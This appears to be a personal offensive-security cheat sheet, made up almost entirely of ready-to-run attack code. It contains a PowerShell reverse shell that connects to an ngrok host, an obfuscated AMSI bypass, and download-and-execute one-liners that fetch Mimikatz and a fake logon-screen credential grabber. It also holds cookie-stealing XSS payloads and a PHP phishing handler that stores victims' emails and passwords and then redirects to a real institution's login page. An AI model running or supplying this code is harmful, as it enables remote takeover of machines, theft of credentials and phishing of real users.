# windows Rerverse shell
```php
$cthulhu = New-Object System.Net.Sockets.TCPClient('0.tcp.ngrok.io',19021 );$tntcl = $cthulhu.GetStream();[byte[]]$cult = 0..65535|% {0};while(($i = $tntcl.Read($cult, 0, $cult.Length)) -ne 0) {;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($cult,0, $i);$ex = (iex $d 2>&1 | Out-String );$ex2 = $ex + 'CF ' + (pwd).Path + '> '; $shog =([text.encoding]::ASCII).GetBytes($ex2);$tntcl.write($shog,0,$shog.Length); $tntcl.Flush()};

```
------------------------------------------------------

# AMSI BYPASS

```php
$forsec = 'System.Management.Automation.A';$yfd = 'si';$ted = 'Ut' + 'ils'
$astute = [Ref].Assembly.GEtTYpe(('{0}m{1}{2}' -f $forsec,$yfd,$ted))
$onlysecthings =$astute.Getfield(('am{0}InitFailed' -f $yfd),'NonPu' + 'blic' + ',St' + 'atic')
$onlysecthings.SetVALuE($null,$true)
```
------------------------------------------------------------

# invoke pattern to download into memory 
```php
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
```
# invoke important ps1 github

**MIMIKATZ**

```php
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
```
**LOGIN SCREEN PASSWORD GRABBER**

```php
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-FakeLogonScreen.ps1')
```

-----------------------------------------------------------------------------------------------

    ngrok TCP PORT for rev listening 

    ngrok http for http service forwarding 


---------------------------------------------------------------------------------------------------

    ngrok tcp 1234
    nc -nvlp 1234

------------------------------------------------------------------------------------------------------

    tmate 

------------------------------------------------------------------------------------------------

# XSS Paylaods

```html
t3_u9po1l%2520onmouseover=alert(document.domain)%2520y=/t1_i5sxroa

javascript:alert(document.cookie)

"><img src=x onerror=prompt(document.cookie);> 

"><img src=x onerror=alert(1)>

<h1>Testing TG</h1>

flkdflkjslkf"><img%20src=x%20onmouseover=confirm(1)>

<svg onload="javascript:window.onerror=confirm;throw 10">
    
<scr<h1>ipt>document.write("<img src=x onerror=confirm(1);>");</scr<h1>ipt>

<svg/onload=alert(1)>
    
```

#alert in window 

    Add-Type -AssemblyName PresentationCore,PresentationFramework

`for alert`

    [System.Windows.MessageBox]::Show($Messageboxbody,$MessageboxTitle,$ButtonType,$messageicon)

# 1linerXSS

    gospider -S subdomains.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox -b astutehacker.xss.ht pipe -o result3.txt

#phishing 
make proccess.php and give process.php to action=/process.php
content of process.php
```
<?php
if(isset($_POST['email']) && isset($_POST['password'])) {
    $password = file_get_contents('phishing.txt');
    $phishing = fopen("phishing.txt", "a");
    fwrite($phishing, $password."email: ".$_POST['email']." Password: ".$_POST['password']."\n");
    fclose($phishing);
    echo '<script>window.location.href="https://su.icloudems.com/corecampus/index.php" </script>';
} else {
    echo '<script>window.location.href="index.html"</script>';
}
?>
```
`"><SVG ONLOAD%3d%26%2397%26%23108%26%23101%26%23114%26%23116(%26%23x64%26%23x6f%26%23x63%26%23x75%26%23x6d%26%23x65%26%23x6e%26%23x74%26%23x2e%26%23x63%26%23x6f%26%23x6f%26%23x6b%26%23x69%26%23x65%26%23x29>`


<iframe
  src="https://carbon.now.sh/embed?bg=rgba%28142%2C180%2C196%2C1%29&t=one-dark&wt=none&l=auto&width=680&ds=true&dsyoff=20px&dsblur=68px&wc=true&wa=true&pv=34px&ph=29px&ln=false&fl=1&fm=Hack&fs=14px&lh=133%25&si=false&es=2x&wm=false&code=%2523%2520Methodology%2520%28semi%2520auto%29%250A%250A%257C%2520%2540prakashchand72%250A%250A-%2520Automate%2520The%2520Recon%2520on%2520github%2520action%2520%250A-%2520github%2520action%250A%2520%250A%2520%257B%250A%2520%2520-%2520find%2520subdomains%250A%2520%2520-%2520find%2520httpx%2520detailed%2520%2520%250A%2520%2520-%2520find%2520httpx%2520live%2520%250A%2520%2520-%2520find%2520waybackurls%2520%250A%2520%2520-%2520automate%2520the%2520hostheader%2520injection%2520%250A%2520%2520-%2520run%2520nuclei%2520for%2520small%2520target%2520%28rarely%2520used%29%250A%2520%2520%250A%2520%2520%257D%250A%2520%2520%250A-%2520check%2520the%2520ssl%2520%252C%2520ip%2520and%2520domain%2520search%2520on%2520the%2520shodan%2520%2526%2520censys%250A%250A%257B%250A%250A*shodan*%250A-%2520ssl.cert.subject.cn%253A%2522namehere%2522%2520%2524statuscode%250A-%2520ssl%253A%2522namehere%2522%2520%2524statuscode%250A%250A*censys*%250A-%2520similar%2520with%2520censys%250A%250A%257D%250A%250A-%2520git%2520dorking%2520%250A%250A%257B%250A-%2520secret%250A-%2520password%250A-%2520token%250A-%2520passwd%250A-%2520pw%250A-%2520%2520_also%2520try%2520to%2520find%2520some%2520endpoints%2520or%2520may%2520be%2520some%2520subdomains_%250A%250A%257D%250A-%2520do%2520use%2520extension%2520%250A%250A%257B%250A%250A-%2520tufflehog%2520-%253E%2520token%252Fapi%252Fcreds%2520disclosure%2520%250A-%2520retire%2520js%2520-%253E%2520js%2520based%2520vuln%250A-%2520shodan%2520-%253E%2520%2520ip%252C%2520host%252C%2520port%250A%250A%257D%250A%250A-%2520now%2520based%2520on%2520finding%2520do%2520futher%2520recon%2520and%2520exploits%250A-%2520go%2520through%2520the%2520httpx%2520result%2520and%2520%2520choose%2520the%2520target%2520%2520that%2520catch%2520your%2520eye%250A-%2520go%2520through%2520the%2520shodan%252Fcensys%2520result%2520and%2520check%2520for%2520uncommon%2520port%2520or%2520service%2520you%2520like%2520to%2520futher%2520exploit%250A-%2520if%2520found%2520some%2520unauthorized%2520page%2520or%2520403%2520do%2520bruteforcing%2520_i%2520prefer%2520ferobuster%2520for%2520directory%2520bruteforcing_%250A-%2520now%2520rest%2520is%2520your%2520manual%2520testing%2520%250A-%2520Spend%2520time%2520on%2520burpsuite%2520and%2520checking%2520each%2520functinality%2520one%2520by%2520one%2520understanding%2520the%2520flow%2520and%2520working%2520%250A-%2520Depending%2520upon%2520the%2520%2520functionality%2520for%2520the%2520vuln%2520testing%2520%250A%250A"
  style="width: 964px; height: 1242px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>
